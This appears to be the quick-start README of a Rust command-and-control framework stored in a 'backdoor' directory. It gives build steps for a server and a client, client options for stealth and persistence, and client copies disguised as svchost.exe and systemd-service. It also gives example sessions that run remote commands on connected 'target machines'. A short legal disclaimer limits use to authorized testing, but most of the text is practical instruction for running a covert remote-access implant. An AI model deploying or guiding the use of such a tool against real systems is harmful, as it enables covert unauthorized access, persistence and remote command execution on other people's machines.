# Quick Start Guide - C2 Framework

🚀 **Build and Run Instructions**

## 📋 Prerequisites

### Windows:
- Install Rust: https://rustup.rs/
- Install Visual Studio Build Tools or Git Bash
- PowerShell or Command Prompt

### Linux/macOS:
- Install Rust: `curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh`
- GCC compiler: `sudo apt install build-essential` (Ubuntu) or `brew install gcc` (macOS)

## 🔨 Build Process

### Step 1: Test Everything First
```batch
REM Windows
test.bat
```

```bash
# Linux/macOS
chmod +x test.sh
./test.sh
```

### Step 2: Build Both Server and Client
```batch
REM Windows
build.bat
```

```bash
# Linux/macOS
chmod +x build.sh
./build.sh
```

The build script will create:
- `output/c2_server` (or `.exe` on Windows) - The C2 server
- `output/c2_client` (or `.exe` on Windows) - The main client
- Several disguised client copies with different names

## 🚀 Running the Framework

### 🖥️ **STEP 1: Start the Server**

#### Windows:
```batch
cd output
c2_server.exe
```

#### Linux/macOS:
```bash
cd output
./c2_server
```

**Expected Output:**
```
🚀 C2 Server Starting...
📍 Binding to 0.0.0.0:4444
🔐 RSA Key Size: 2048 bits
⏰ Heartbeat Timeout: 300 seconds
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✅ Server listening on 0.0.0.0:4444

🎛️  Admin Interface Ready - Type 'help' for commands

C2> 
```

### 📱 **STEP 2: Connect Client (Same Machine Test)**

**Open a new terminal/command prompt:**

#### Windows:
```batch
cd output
c2_client.exe --server 127.0.0.1 --no-stealth
```

#### Linux/macOS:
```bash
cd output
./c2_client --server 127.0.0.1 --no-stealth
```

**Note:** `--no-stealth` is used for testing so you can see what's happening.

### 📱 **STEP 3: Connect Client (Remote Machine)**

#### On Target Machine:
```batch
REM Windows (replace with your server IP)
c2_client.exe --server 192.168.1.100 --port 4444

# Linux/macOS (replace with your server IP)
./c2_client --server 192.168.1.100 --port 4444
```

## 🎮 Using the Server

Once clients connect, you'll see them in the server output:

```
🔗 New connection from 192.168.1.50:54321
✅ Handshake completed for client: DESKTOP-ABC123_user_a1b2c3
🔐 Session established for client: DESKTOP-ABC123_user_a1b2c3
```

### Basic Commands:

```bash
C2> help                                    # Show all commands
C2> clients                                 # List connected clients
C2> info DESKTOP-ABC123_user_a1b2c3        # Show client details
C2> exec DESKTOP-ABC123_user_a1b2c3 whoami # Execute command
C2> results DESKTOP-ABC123_user_a1b2c3     # View command results
C2> exit                                    # Shutdown server
```

## 🧪 Example Session

### 1. Start Server:
```bash
./c2_server
```

### 2. Connect Client:
```bash
./c2_client --server 127.0.0.1 --no-stealth
```

### 3. Server Side - Execute Commands:
```bash
C2> clients
Connected Clients:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🟢 ACTIVE | MyPC_user_a1b2c3 | us***@MyPC | Windows 11 | Last seen: 2025-08-06 14:30:25 UTC

C2> exec MyPC_user_a1b2c3 whoami
✅ Command queued for MyPC_user_a1b2c3: whoami (ID: cmd-uuid-1234)

C2> results MyPC_user_a1b2c3
Command Results for MyPC_user_a1b2c3: (1 results)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
1. [14:30:45] Command: cmd-uuid-1234
   Output:
   mypc\user
```

### 4. More Commands to Try:
```bash
# System information
C2> exec MyPC_user_a1b2c3 systeminfo

# Network info
C2> exec MyPC_user_a1b2c3 ipconfig /all

# Directory listing
C2> exec MyPC_user_a1b2c3 dir C:\Users

# Process list
C2> exec MyPC_user_a1b2c3 tasklist

# Linux equivalents:
C2> exec MyPC_user_a1b2c3 uname -a
C2> exec MyPC_user_a1b2c3 ifconfig
C2> exec MyPC_user_a1b2c3 ps aux
C2> exec MyPC_user_a1b2c3 ls -la /home
```

## 🔧 Advanced Usage

### Client Options:
```bash
# Custom server and port
./c2_client --server 192.168.1.100 --port 8080

# Disable persistence (no auto-start)
./c2_client --server 192.168.1.100 --no-persistence

# Custom timing
./c2_client --server 192.168.1.100 --reconnect-delay 60 --heartbeat-interval 120

# Debug mode (verbose output)
./c2_client --server 192.168.1.100 --no-stealth --no-persistence
```

### Server Configuration:
Edit `output/server_config.toml`:
```toml
[server]
bind_address = "0.0.0.0"  # Interface to bind
bind_port = 4444          # Port to listen on
max_clients = 100         # Max concurrent clients
heartbeat_timeout = 300   # Client timeout (seconds)
```

## 🛠️ Troubleshooting

### Common Issues:

1. **"Rust not found"**
   ```bash
   # Install Rust
   curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh
   source ~/.cargo/env
   ```

2. **Build fails on Windows**
   ```batch
   # Install Visual Studio Build Tools
   # Or use Git Bash instead of Command Prompt
   ```

3. **Client can't connect**
   ```bash
   # Check firewall
   # Windows: Allow through Windows Firewall
   # Linux: sudo ufw allow 4444
   
   # Test with telnet
   telnet 192.168.1.100 4444
   ```

4. **Permission denied (Linux)**
   ```bash
   chmod +x c2_server c2_client
   ```

### Debug Mode:
```bash
# Build debug version for more verbose output
cd c2_server
cargo build  # (not --release)
./target/debug/c2_server

cd ../c2_client
cargo build
./target/debug/c2_client --server 127.0.0.1 --no-stealth
```

## 📁 File Structure After Build:

```
backdoor/
├── output/
│   ├── c2_server(.exe)        # Main server
│   ├── c2_client(.exe)        # Main client
│   ├── svchost.exe            # Disguised client (Windows)
│   ├── systemd-service        # Disguised client (Linux)
│   ├── server_config.toml     # Server configuration
│   └── client_config.toml     # Client configuration
├── c2_server/                 # Server source code
├── c2_client/                 # Client source code
├── build.sh/.bat             # Build scripts
├── test.sh/.bat              # Test scripts
└── README.md                 # Full documentation
```

## ⚖️ Legal Reminder

**ONLY USE FOR:**
- ✅ Authorized penetration testing
- ✅ Red team exercises with permission
- ✅ Educational purposes in controlled environments
- ✅ Security research

**NEVER USE FOR:**
- ❌ Unauthorized access to systems
- ❌ Malicious activities
- ❌ Any illegal purposes

Always get explicit written permission before testing!

---

🎯 **Quick Commands Summary:**
```bash
# Test everything
./test.sh

# Build everything
./build.sh

# Start server
./output/c2_server

# Connect client (new terminal)
./output/c2_client --server 127.0.0.1 --no-stealth

# In server: list clients
C2> clients

# In server: execute command
C2> exec <client_id> whoami
```
